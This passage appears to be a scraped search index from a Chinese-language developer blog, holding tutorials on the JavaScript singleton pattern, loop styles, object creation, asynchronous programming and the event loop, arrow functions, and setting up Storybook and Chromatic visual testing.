return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter1 = new Counter(); const counter2 = new Counter(); console.log(counter1.getInstance() === counter2.getInstance()); // false   通过两次调用新方法，发现 counter1 和 counter2 被设置为不相等的实例。\ncounter1 和 counter2 上的 getInstance 方法返回的值有效地返回了对不同实例的引用。\n\r如何确保只能创建类的一个实例？   确保只能创建一个实例的一种方法是创建一个名为 instance 的变量。\n  在 Counter 的构造函数中，我们可以在创建新实例时将 instance 设置为对实例的引用。\n  我们可以通过检查实例变量是否已经有值来防止新的实例化，并通过 throw 语句抛出错误提示。\n  throw 语句用来抛出一个用户自定义的异常。当前函数的执行将被停止（throw之后的语句将不会执行），并且控制将被传递到调用堆栈中的第一个catch块。如果调用者函数中没有catch块，程序将会终止。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); //throw 语句用来抛出一个用户自定义的异常。当前函数的执行将被停止（throw 之后的语句将不会执行）。  } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter = new Counter(); const counter2 = new Counter(); // Error: 您只能创建一个实例！   上面这种情况，如果实例已经存在，则不应该继续：抛出一个错误让用户知道。\nPerfect! 我们无法再创建多个实例。\n\r如何冻结单例？ 让我们从 counter.js 文件中导出 Counter 实例。 但在此之前，我们也应该冻结实例。\nObject.freeze() 方法可以冻结一个对象。一个被冻结的对象再也不能被修改。此外，冻结一个对象后该对象的原型也不能被修改。freeze() 返回和传入的参数相同的对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   \r单例的实例演示 Counter计数器应用程序。有以下文件：\n counter.js：包含 Counter 类，并导出一个 Counter 实例作为其默认导出 index.js：加载 redButton.js 和 blueButton.js 模块 redButton.js：导入Counter，并在红色按钮上添加 Counter 的 increment 方法作为事件监听器，通过调用 getCount 方法记录 counter 的当前值 blueButton.js：导入Counter，并在蓝色按钮上添加 Counter 的 increment 方法作为事件监听器，通过调用 getCount 方法记录 counter 的当前值 blueButton.js 和 redButton.js 从 counter.js 导入相同的实例。 此实例在两个文件中都作为 Counter 导入。  当我们在 redButton.js 或 blueButton.js 中调用 increment 方法时，两个文件中 Counter 实例的 counter 属性的值都会更新。 我们点击红色按钮还是蓝色按钮并不重要：所有实例共享相同的值。 这就是为什么即使我们在不同的文件中调用该方法，计数器也会不断增加 1 的原因。\n\r使用常规对象字面量实现 在许多编程语言中，例如 Java 或 C++，无法像在 JavaScript 中那样直接创建对象。 在那些面向对象的编程语言中，我们需要创建一个类，通过它创建一个对象。创建的对象具有类的实例的值，就像 JavaScript 示例中实例的值一样。\n但是，上面示例中显示的类实现实际上是矫枉过正。由于我们可以直接在 JavaScript 中创建对象，因此我们可以简单地使用常规对象来实现完全相同的结果。\n count property 将 count 的值 +1 的 increment 方法 将 count 的值 -1 的 decrement 方法  与 ES6 的 class 实现方式等效\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let count = 0; const counter = { increment() { return ++count; }, decrement() { return --count; } }; Object.freeze(counter); export { counter };   由于对象是通过引用（reference）传递的，因此 redButton.js 和 blueButton.js 都导入了对同一个 singletonCounter 对象的引用。 修改其中一个文件中的 count 值将修改 singletonCounter 上的值，这在两个文件中都可见。\n\r单例的优缺点 将实例化限制为仅一个实例可能会节省大量内存空间。不必每次都为一个新实例设置内存，我们只需为整个应用程序引用的那个实例设置内存。\n然而，单例实际上被认为是一种反模式，并且可以（或应该）在 JavaScript 中避免。\n让我们介绍一下使用单例的一些缺点！\n1. 测试 测试依赖于 Singleton 的代码可能会变得棘手。 由于我们不能每次都创建新的实例，所以所有的测试都依赖于对之前测试的全局实例的修改。 在这种情况下，测试的顺序很重要，一个小的修改可能会导致整个测试套件失败。 测试后，我们需要重置整个实例，以重置测试所做的修改。\nsrc/conterTest.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // 此文件是必需的，确保此示例中的测试不会失败。 // 它是 counter.js 的副本  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); } instance = this; this.counter = counter; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  import Counter from \u0026#34;../src/counterTest\u0026#34;; test(\u0026#34;增加 1 次应该是 1\u0026#34;, () =\u0026gt; { Counter.increment(); expect(Counter.getCount()).toBe(1); }); test(\u0026#34;增加 3 个额外的次数应该是 4\u0026#34;, () =\u0026gt; { Counter.increment(); Counter.increment(); Counter.increment(); expect(Counter.getCount()).toBe(4); }); test(\u0026#34;递减1次应该是3\u0026#34;, () =\u0026gt; { Counter.decrement(); expect(Counter.getCount()).toBe(3); });   2. 依赖隐藏 在本例中导入另一个模块 superCounter.js 时，该模块导入的单例可能并不明显。 在其他文件中，例如本例中的 index.js，我们可能会导入该模块并调用其方法。 这样，我们不小心修改了 Singleton 中的值。 这可能会导致意外行为，因为可以在整个应用程序中共享多个单例实例，这些实例也会被修改。\n3. 全局行为 Singleton 实例应该能够在整个应用程序中被引用。全局变量本质上表现出相同的行为：由于全局变量在全局范围内可用，我们可以在整个应用程序中访问这些变量。\n拥有全局变量通常被认为是一个糟糕的设计决策。全局范围污染最终可能会意外覆盖全局变量的值，从而导致许多意外行为。\n在 ES2015 中，创建全局变量是相当罕见的。新的 let 和 const 关键字通过将使用这两个关键字声明的变量保持在块范围内来防止开发人员意外污染全局范围。 JavaScript 中的新模块系统通过能够从模块导出值并将这些值导入其他文件，从而在不污染全局范围的情况下更容易地创建全局可访问值。\n但是，单例的常见用例是在整个应用程序中拥有某种全局状态。让代码库的多个部分依赖同一个可变对象可能会导致意外行为。\n通常，代码库的某些部分修改这些全局状态中的值，而其他部分则使用该数据。这里的执行顺序很重要：我们不想在没有数据要消费的时候（还）不小心先消费数据！随着应用程序的增长，了解使用全局状态时的数据流会变得非常棘手，并且数十个组件相互依赖。\n\rReact 中的状态管理 在 React 中，我们经常通过 Redux 或 React Context 等状态管理工具来依赖全局状态，而不是使用 Singleton。 尽管它们的全局状态行为可能看起来类似于 Singleton 的行为，但这些工具提供只读状态而不是 Singleton 的可变状态。 使用 Redux 时，只有纯函数化简器（reducers）才能在组件通过调度程序（dispatcher）发送操作后更新状态。\n尽管使用这些工具并没有神奇地消除拥有全局状态的缺点，但我们至少可以确保全局状态按照我们想要的方式进行变异，因为组件不能直接更新状态。\n\r知识点  class 对象字面量 throw 语句 Object.freeze()  ","description":"在应用程序中共享一个全局实例","id":47,"section":"react-patterns","tags":null,"title":"单例模式","uri":"https://codthing.github.io/react-patterns/design-patterns/single-patterns/"},{"content":"这里用 For 循环举例\n命令式 1 2 3 4 5 6 7 8 9 10 11 12 13  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; let filePaths = []; for (let file of files) { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; filePaths.push(filePath); } } // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   函数式 封装性更好\n1 2 3 4 5 6 7 8 9 10 11 12  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files.reduce((acc, file) =\u0026gt; { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; acc.push(filePath); } return acc; }, []); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   链式 与函数式相比，更直观，也是建议使用的方式\n1 2 3 4 5 6 7 8  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files .map((file) =\u0026gt; file.trim()) .filter(Boolean) .map((fileName) =\u0026gt; `~/cool_app/${fileName}`); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   ","description":"常见的编程模式","id":48,"section":"javascript","tags":null,"title":"命令式 vs 函数式 vs 链式","uri":"https://codthing.github.io/javascript/function/for/"},{"content":"一、创建对象（字面量对象） 1 2 3 4  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2 }   这个 duck 对象有两组键值对：一个是 name 属性，它的值是 Aflac；另一个是 numLegs 属性，它的值是 2。\n\r二、访问对象 1 2 3 4 5  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2 }; console.log(duck.name); // Aflac   可以用 点号表示法 来访问对象的属性，duck 后面加上点号以及属性名 name，来访问到 Aflac。\n\r三、在对象上创建方法 对象可以有一个叫做 method 的特殊属性。\n方法属性也就是函数。 这给对象添加了不同的行为。\n以下就是一个带有方法属性的 duck 示例：\n1 2 3 4 5 6  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2, sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + duck.name + \u0026#34;.\u0026#34;;} }; duck.sayName(); // The name of this duck is Aflac.   \r四、使用 this 关键字提高代码重用性 1  sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + duck.name + \u0026#34;.\u0026#34;;}   虽然这是访问对象属性的有效方法，但是这里有一个陷阱。\n如果变量名发生了改变，那么引用了原始名称的任何代码都需要更新。\n在一个简短的对象定义中，这并不是问题，但是如果对象有很多对其属性的引用，那么发生错误的可能性就更大了。\n可以使用 this 关键字 来避免这一问题：\n1 2 3 4 5  let duck = { name: \u0026#34;Aflac\u0026#34;, numLegs: 2, sayName: function() {return \u0026#34;The name of this duck is \u0026#34; + this.name + \u0026#34;.\u0026#34;;} };   this 是一个很复杂的知识点，而上面那个例子也只是使用它的一种方法而已。\n在当前的上下文环境中，this 指向的就是与这个方法有关联的 duck 对象。\n如果把对象的变量名改为 mallard，那使用 this 后就没有必要在代码中找到所有指向 duck 的部分。\n这样可以使得代码更具有可读性和复用性。\n\r总结 字面量对象很简洁，但是不够灵活，因为不能传参\n","description":"简洁","id":49,"section":"javascript","tags":null,"title":"基本的JS对象（字面量对象）","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/create-object/"},{"content":"Object 概述 Object 是 JavaScript 的一种 数据类型 。它用于存储各种键值集合和更复杂的实体。\nObjects 可以通过 对象字面量、构造函数 或者 class 的方式创建\n一、对象字面量 （{\u0026hellip;}） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  let user = { name: \u0026#34;Lucy\u0026#34;, sayHi(){ console.log(this.name) // Lucy, this指的是“当前的对象”  } } user.sayHi() // Lucy  // 箭头函数 // 这是箭头函数的一个特性，当我们并不想要一个独立的 this，反而想从外部上下文中获取时，它很有用。 let user = { name: \u0026#34;Lucy\u0026#34;, sayHi() { let arrow = () =\u0026gt; console.log(this.name); arrow(); } }; user.sayHi(); // Lucy   二、构造器 + new 常规的 {\u0026hellip;} （字面量） 语法允许创建一个对象。但是我们经常需要创建许多类似的对象，例如多个用户或菜单项等。\n这可以使用构造器（构造函数）和new操作符来实现。\n从技术上讲，任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器。\n即可以通过 new 来运行，它会执行上面的算法。\n首字母大写是一个共同的约定，以明确表示一个函数将被使用 new 来运行。\n#. 约定 构造函数在技术上是常规函数。不过有两个约定：\n 它们的命名以大写字母开头。 它们只能由 new 操作符来执行。  #. 实列 1 2 3 4 5 6 7 8 9 10 11 12 13  function User(name) { // this = {};（隐式创建）  // 添加属性到 this  this.name = name; this.isAdmin = false; // return this;（隐式返回） } const val1 = new User(\u0026#34;Jack\u0026#34;); console.log(val1) //{name: \u0026#34;Jack\u0026#34;, isAdmin: false, constructor: Object}   等同于字面量Object\n1 2 3 4 5 6 7  let user = { name: \u0026#34;Jack\u0026#34;, isAdmin: false } console.log(user) //name: \u0026#34;Jack\u0026#34;, isAdmin: false}   三、class + new 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class ClassMates{ constructor(name,age){ this.name=name; this.age=age; } displayInfo(){ return this.name + \u0026#34;is \u0026#34; + this.age + \u0026#34; years old!\u0026#34;; } } // 用法： let classmate = new ClassMates(\u0026#34;Mike Will\u0026#34;,15); classmate.displayInfo(); // result: Mike Will is 15 years old!  // 其实class也是一个function console.log(typeof ClassMates); // function   ","description":"Object 三剑客","id":50,"section":"javascript","tags":null,"title":"字面量 vs 构造器 vs class","uri":"https://codthing.github.io/javascript/function/new/"},{"content":"在现有项目的根目录中运行：\nnpx sb init 运行：\nyarn storybook ","description":"React Storybook 简介","id":51,"section":"react","tags":null,"title":"安装","uri":"https://codthing.github.io/react/storybook/sb-started/sb-install/"},{"content":"JavaScript 默认是同步的，并且是单线程的。这意味着代码不能创建新线程并并行运行。\n一行一行的代码依次执行，例如：\n1 2 3 4 5 6  const a = 1 const b = 2 const c = a * b console.log(c) doSomething()   \r一、回调 例如，无法知道用户何时会单击按钮。因此，为 click 事件定义了一个事件处理程序。此事件处理程序接受一个函数，该函数将在事件触发时调用：\n1 2 3 4  document.getElementById(\u0026#39;button\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { //item clicked })   这就是所谓的回调。\n1. 处理回调中的错误 任何回调函数中的第一个参数是错误对象：错误优先回调。这是 Node.js 采用的策略。\n1 2 3 4 5 6 7 8 9 10 11  fs.readFile(\u0026#39;/file.json\u0026#39;, (err, data) =\u0026gt; { if (err) { //handle error  console.log(err) return } //no errors, process data  console.log(data) })   2. 回调的问题 回调非常适合简单的情况！\n然而，每个回调都会增加一层嵌套，当你有很多回调时，代码很快就会变得复杂：（回调地狱）\n1 2 3 4 5 6 7 8 9 10  window.addEventListener(\u0026#39;load\u0026#39;, () =\u0026gt; { document.getElementById(\u0026#39;button\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { setTimeout(() =\u0026gt; { items.forEach(item =\u0026gt; { //your code here  }) }, 2000) }) })   \r二、Promises (ES6) Promise 是处理异步代码的一种方式，不会陷入回调地狱。\n1. 创建 Promise 1 2 3 4 5 6 7 8 9 10 11 12  let done = true const isItDoneYet = new Promise((resolve, reject) =\u0026gt; { if (done) { const workDone = \u0026#39;这是我构建的东西\u0026#39; resolve(workDone) } else { const why = \u0026#39;还在做别的事情\u0026#39; reject(why) } })   2. 消费 Promise 1 2 3 4 5 6 7 8 9 10 11 12 13  const isItDoneYet = new Promise(/* ... as above ... */) //...  const checkIfItsDone = () =\u0026gt; { isItDoneYet .then(ok =\u0026gt; { console.log(ok) }) .catch(err =\u0026gt; { console.error(err) }) }    运行checkIfItsDone()指定在isItDoneYet承诺解决（在then调用中）或拒绝（在catch调用中）时要执行的函数。  3. 链式 Promise 一个承诺可以返回到另一个承诺，创建一个承诺链。\n链式 promise 的一个很好的例子是 Fetch API，可以使用它来获取资源并在获取资源时将一系列 promise 排队执行。\nFetch API 是一种基于 promise 的机制，调用fetch()相当于使用new Promise()。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const status = response =\u0026gt; { if (response.status \u0026gt;= 200 \u0026amp;\u0026amp; response.status \u0026lt; 300) { return Promise.resolve(response) } return Promise.reject(new Error(response.statusText)) } const json = response =\u0026gt; response.json() fetch(\u0026#39;/todos.json\u0026#39;) .then(status) // 请注意，status 函数实际上在这里被调用，并且它返回一个承诺  .then(json) // 同样，这里唯一的区别是这里的 json 函数返回一个用 data 解析的 promise  .then(data =\u0026gt; { // ...这就是为什么 data 在这里显示为匿名函数的第一个参数  console.log(\u0026#39;Request succeeded with JSON response\u0026#39;, data) }) .catch(error =\u0026gt; { console.log(\u0026#39;Request failed\u0026#39;, error) })   4. 处理错误 1 2 3 4 5 6 7 8 9 10 11 12 13 14  new Promise((resolve, reject) =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }).catch(err =\u0026gt; { console.error(err) }) // or  new Promise((resolve, reject) =\u0026gt; { reject(\u0026#39;Error\u0026#39;) }).catch(err =\u0026gt; { console.error(err) })   5. 级联错误 如果在 catch() 内部引发错误，则可以附加第二个 catch() 来处理它，依此类推。\n1 2 3 4 5 6 7 8 9 10  new Promise((resolve, reject) =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }) .catch(err =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }) .catch(err =\u0026gt; { console.error(err) })   6. 协调 Promise Promise.all() 如果需要同步不同的 promise，Promise.all() 帮助定义一个 promise 列表，并在它们全部解决后执行一些事情。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  const f1 = fetch(\u0026#39;/something.json\u0026#39;) const f2 = fetch(\u0026#39;/something2.json\u0026#39;) Promise.all([f1, f2]) .then(res =\u0026gt; { console.log(\u0026#39;Array of results\u0026#39;, res) }) .catch(err =\u0026gt; { console.error(err) }) // or  Promise.all([f1, f2]).then(([res1, res2]) =\u0026gt; { console.log(\u0026#39;Results\u0026#39;, res1, res2) })   Promise.race() Promise.race() 在您传递给它的第一个承诺解决（解决或拒绝）时运行，并且它只运行一次附加的回调，第一个承诺的结果得到解决。\n1 2 3 4 5 6 7 8 9 10 11  const first = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 500, \u0026#39;first\u0026#39;) }) const second = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 100, \u0026#39;second\u0026#39;) }) Promise.race([first, second]).then(result =\u0026gt; { console.log(result) // second })   Promise.any() Promise.any() 在您传递给它的任何承诺实现或所有承诺被拒绝时解决。 它返回一个单一的承诺，该承诺以第一个已履行的承诺中的值进行解析。 如果所有 Promise 都被拒绝，则返回的 Promise 将被拒绝并带有 AggregateError。\n1 2 3 4 5 6 7 8 9 10 11  const first = new Promise((resolve, reject) =\u0026gt; { setTimeout(reject, 500, \u0026#39;first\u0026#39;) }) const second = new Promise((resolve, reject) =\u0026gt; { setTimeout(reject, 100, \u0026#39;second\u0026#39;) }) Promise.any([first, second]).catch(error =\u0026gt; { console.log(error) // AggregateError })   7. 常见错误 未捕获的类型错误 Uncaught TypeError: undefined is not a promise\n如果在控制台中收到 Uncaught TypeError: undefined is not a promise 错误，请确保使用 new Promise() 而不是 Promise()。\n未处理的承诺拒绝警告 UnhandledPromiseRejectionWarning\n这意味着调用的承诺被拒绝，但没有用于处理错误的捕获。 添加一个 catch 捕获 然后正确处理它。\n\r三、async/await (ES2017) Promise 是为了解决著名的回调地狱问题而引入的，但它们自身也引入了复杂性和语法复杂性。\nasync/await 是建立在 promises 之上的，用于解决这种复杂性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Promise const aFunction = () =\u0026gt; { return Promise.resolve(\u0026#39;test\u0026#39;) } aFunction().then(alert) // This will alert \u0026#39;test\u0026#39;  // async const aFunction = async () =\u0026gt; { return \u0026#39;test\u0026#39; } aFunction().then(alert) // This will alert \u0026#39;test\u0026#39;   更复杂的例子(多个异步函数串联)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  const promiseToDoSomething = () =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(() =\u0026gt; resolve(\u0026#39;I did something\u0026#39;), 10000) }) } const watchOverSomeoneDoingSomething = async () =\u0026gt; { const something = await promiseToDoSomething() return something + \u0026#39;\\nand I watched\u0026#39; } const watchOverSomeoneWatchingSomeoneDoingSomething = async () =\u0026gt; { const something = await watchOverSomeoneDoingSomething() return something + \u0026#39;\\nand I watched as well\u0026#39; } watchOverSomeoneWatchingSomeoneDoingSomething().then(res =\u0026gt; { console.log(res) }) // I did something // and I watched // and I watched as well   \r四、事件循环 1. 重要性 事件循环是了解 Node.js 的最重要方面之一。\n它解释了 Node.js 如何可以是异步的并且具有非阻塞 I/O，所以它基本上解释了 Node.js 作为 “杀手级应用程序” 为何如此成功。\nNode.js JavaScript 代码在单线程上运行。一次只发生一件事。\n这是一个实际上非常有用的限制，因为它大大简化了编程方式，而无需担心并发问题。\n只需要注意如何编写代码并避免任何可能阻塞线程的事情，例如同步网络调用或无限循环。\n2. 案例 举例来说，在大多数浏览器中，每个浏览器选项卡都有一个事件循环，使每个进程隔离，避免网页无限循环或繁重的处理来阻塞整个浏览器。\n该环境管理多个并发事件循环，例如处理 API 调用。 Web Workers 也运行在他们自己的事件循环中。\n主要需要担心代码将在单个事件循环上运行，并在编写代码时考虑到这一点，以避免阻塞它。\n3. 阻塞事件循环 任何需要太长时间将控制权返回给事件循环的 JavaScript 代码都会阻塞页面中任何 JavaScript 代码的执行，甚至阻塞 UI 线程，并且用户无法四处点击、滚动页面等。\nJavaScript 中几乎所有的 I/O 原语都是非阻塞的。\n网络请求、文件系统操作等 阻塞是一个例外，这就是为什么 JavaScript 如此多地基于回调，最近又有了 promise 和 async/await。\n4. 调用栈 调用堆栈是一个 LIFO（后进先出）堆栈。\n事件循环不断检查调用堆栈以查看是否有任何函数需要运行。\n这样做时，它会找到的任何函数调用添加到调用堆栈中，并按顺序执行每个调用。\n您知道调试器或浏览器控制台中您可能熟悉的错误堆栈跟踪吗？ 浏览器在调用堆栈中查找函数名称以通知您哪个函数发起当前调用：\n5. 事件循环解释 1 2 3 4 5 6 7 8 9 10 11 12  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) bar() baz() } foo()   当此代码运行时，首先调用 foo()。 在 foo() 中，首先调用 bar()，然后调用 baz()。\n每次迭代的事件循环都会查看调用堆栈中是否有内容，并执行它：\n直到调用栈为空。\n1). 排队功能执行 上面的例子看起来很正常，没有什么特别之处：JavaScript 找到要执行的东西，按顺序运行它们。\n让我们看看如何将函数推迟到堆栈清除为止。\nsetTimeout(() =\u0026gt; {}, 0) 的用例是调用一个函数，但是代码中的每个函数都执行一次。\n例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) setTimeout(bar, 0) baz() } foo() // foo // baz // bar   当此代码运行时，首先调用 foo()。 在 foo() 中，首先调用 setTimeout，将 bar 作为参数传递，然后指示它尽可能快地立即运行，将 0 作为计时器传递。 然后调用 baz()。\n此时调用堆栈如下所示：\n这是程序中所有函数的执行顺序：\n为什么会这样？\n2). 消息队列 当 setTimeout() 被调用时，浏览器或 Node.js 启动计时器。 一旦计时器到期，回调函数被放入消息队列中。\n消息队列也是用户发起的事件（如单击或键盘事件）或获取响应在您的代码有机会对其做出反应之前排队的地方。 或者还有像 onload 这样的 DOM 事件。\n循环优先处理调用栈，它首先处理在调用栈中找到的所有东西，一旦里面没有任何东西，它就会去消息队列中取东西。\n不必等待 setTimeout、fetch 或其他函数来做自己的工作，因为它们是由浏览器提供的，并且它们存在于自己的线程中。 例如，如果将 setTimeout 超时设置为 2 秒，则不必等待 2 秒 - 等待发生在其他地方。\n6. ES6 作业队列 ECMAScript 2015 引入了 Job Queue 的概念，它被 Promises 使用（也在 ES6/ES2015 中引入）。 这是一种尽快执行异步函数结果的方法，而不是放在调用堆栈的末尾。\n在当前函数结束之前解析的 Promise 将在当前函数之后立即执行。\n例如，在游乐园坐过山车：\n消息队列把你放在队列的后面，在所有其他人的后面，你必须在那里等待轮到你，\n而作业队列是快速通行证 这样就可以在完成上一次骑行后立即乘坐另一次骑行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) setTimeout(bar, 0) new Promise((resolve, reject) =\u0026gt; resolve(\u0026#39;应该在 baz 之后，在 bar 之前\u0026#39;) ).then(resolve =\u0026gt; console.log(resolve)) baz() } foo() // foo // baz // 应该在 baz 之后，在 bar 之前 // bar   这是 Promises（和 Async/await，它建立在 Promise 之上）和通过 setTimeout() 或其他平台 API 实现的普通异步函数之间的巨大差异。\n最后，这是上面示例的调用堆栈的样子：\n","description":"Node.js 基于异步编程","id":52,"section":"nodejs","tags":null,"title":"异步编程","uri":"https://codthing.github.io/nodejs/nodebase/node-programming/"},{"content":"JavaScript 的箭头函数从表面上看可能与常规函数相同，但它们有一些非常重要的区别：\n关键区别  语法 this 值（执行上下文） 用作类方法 用作构造函数 arguments 参数绑定  #. 语法 1 2 3 4 5 6 7  const square = a =\u0026gt; a * a; // 允许省略单个参数周围的括号; 隐式返回;  // 等效常规function function square(a) { return a * a; }   #. 执行上下文  this  1 2 3 4 5 6 7 8 9 10 11 12 13  const logThisArrow = () =\u0026gt; { console.log(this); }; document.addEventListener(\u0026#39;click\u0026#39;, logThisArrow); // `this` 指的是全局对象  // 常规函数 function logThis() { console.log(this); } document.addEventListener(\u0026#39;click\u0026#39;, logThis); // `this` 指的是 document    Function.prototype.call() Function.prototype.bind() Function.prototype.apply()  以上3个方法箭头函数也不能工作。因为这三个方法目的式允许函数在不同的范围内执行。\n但是箭头函数的 this 值不能改变，因为它是词法解析的。\n1 2 3 4 5 6 7 8 9 10 11  const logThisArrow = () =\u0026gt; { console.log(this); }; logThisArrow.call(42); // Logs: 全局对象  // 常规函数 function logThis() { console.log(this); } logThis.call(42); // Logs: 42   #. 用作类方法 由于箭头函数没有定义自己的执行上下文，因此它们不太适合用作方法。\n然而，由于Class fields proposal，如果您的环境支持，箭头函数可以用作类内部的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13  const obj = { x: 42, logThisX: function() { console.log(this.x, this); }, logThisXArrow: () =\u0026gt; { console.log(this.x, this); } }; obj.logThisX(); // Logs: 42, Object {...} obj.logThisXArrow(); // Logs: undefined, the global object   #. 用作构造函数 常规函数可以用作构造函数，使用new关键字。\nthis内部箭头函数的词法解析的另一个结果是它们不能用作构造函数。使用new在一个箭头作用的结果TypeError。\n1 2 3 4 5 6 7 8 9 10  const Bar = foo =\u0026gt; { this.foo = foo; }; const b = new Bar(42); // TypeError: Bar is not a constructor  function Foo(bar) { this.bar = bar; } const a = new Foo(42); // Foo {bar: 42}   #. arguments 参数绑定 另一个区别是arguments对象的绑定。\n与常规函数不同，箭头函数没有自己的arguments对象。绕过此限制的现代替代方案是使用其余参数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  function sum() { return arguments[0] + arguments[1]; }; sum(4, 6); // 10  const arguments = [1, 2, 3]; const sumArrow = () =\u0026gt; { return arguments[0] + arguments[1]; }; sumArrow(4, 6); // 3 (resolves to 1 + 2)  const sumRest = (...arguments) =\u0026gt; { return arguments[0] + arguments[1]; } sumRest(4, 6); // 10   #. 其他差异 最后，还有一些其他差异并不那么重要，但值得一提。\n这些包括缺少prototype箭头函数中的属性，以及yield关键字可能不会在箭头函数的主体中使用的事实。\n后者的结果是箭头函数不能用作生成器。\n","description":"JavaScript 中的箭头函数和常规函数的区别","id":53,"section":"javascript","tags":null,"title":"箭头函数 vs 常规函数","uri":"https://codthing.github.io/javascript/function/arrow/"},{"content":"视觉测试 可视化测试，也称为可视化回归测试，可捕获 UI 外观中的错误。\n通过截取每个故事的屏幕截图并将它们提交进行比较以识别更改来工作。\n非常适合验证用户看到的内容：布局、颜色、大小和对比度。\nStorybook 是视觉测试的绝佳工具，因为每个故事本质上都是一个测试规范。\n每当编写或更新故事时，都会免费获得规范。\n有许多用于视觉测试的工具。\n建议使用 Storybook 维护的 Chromatic 在闪电般快速的云浏览器环境中运行视觉测试。\n对于 Chromatic 的自我管理替代方案，提供 StoryShots 。\n通过与 jest-image-snapshot 集成来对故事运行视觉测试。\n\r设置 Chromatic 插件 Chromatic 是为 Storybook 构建的云服务。\n使用零配置运行可视化测试。\n首先，使用 GitHub、GitLab、Bitbucket 或电子邮件进行注册，并为 Storybook 生成一个唯一的 project-token。\n接下来，从 yarn 安装 chromium CLI 包：\n1 2  yarn add --dev chromatic   软件包安装完成后运行以下命令：\n1 2  npx chromatic --project-token \u0026lt;your-project-token\u0026gt;   注意： 不要忘记将 your-project-token 替换为 Chromatic 提供的令牌。\n1 2 3 4  Build 1 published. View it online at https://www.chromatic.com/build?appId=...\u0026amp;number=1.   当 Chromatic 完成时，它应该已经成功部署了您的 Storybook 并为您的所有组件的故事建立了基线（即起点）。\n此外，为您提供指向已发布 Storybook 的链接，可以与团队共享该链接以收集反馈。\n\r捕捉 UI 变化 每次运行 Chromatic 时，它都会生成新快照并将它们与现有基线进行比较。 这是检测 UI 更改和防止潜在 UI 回归的理想选择。\n例如，假设您正在处理一个组件并调整样式。 当 Chromatic 重新运行时，它将突出显示基线和更新组件之间的差异。\n如果更改是有意的，请将其作为基线。 